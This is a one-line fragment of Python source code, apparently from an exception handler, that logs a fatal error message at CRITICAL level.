        log(f"Fatal error: {e}", "CRITICAL")
